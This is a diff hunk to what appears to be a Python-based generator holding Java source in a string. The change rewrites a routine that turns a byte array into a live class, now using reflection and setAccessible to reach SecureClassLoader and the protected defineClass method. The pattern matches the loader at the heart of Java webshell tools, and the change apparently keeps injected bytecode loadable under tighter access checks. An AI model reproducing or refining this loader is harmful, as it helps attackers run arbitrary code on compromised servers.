@@ -48,9 +48,17 @@ code = """
             } catch (Exception e) {}
             return result;
         } else {
-            lock = this.getClass().getConstructor(ClassLoader.class)
-            .newInstance(this.getClass().getClassLoader())
-            .defineClass(b, 0, b.length);
+            Constructor constructor = java.security.SecureClassLoader.class
+                .getDeclaredConstructor(ClassLoader.class);
+            constructor.setAccessible(true);
+            ClassLoader classloader = (ClassLoader) constructor.newInstance(
+                new Object[]{this.getClass().getClassLoader()}
+            );
+            Method defineMethod = ClassLoader.class.getDeclaredMethod(
+                "defineClass", byte[].class, int.class, int.class
+            );
+            defineMethod.setAccessible(true);
+            lock = defineMethod.invoke(classloader, b, 0, b.length);
         }
         return null;
     }
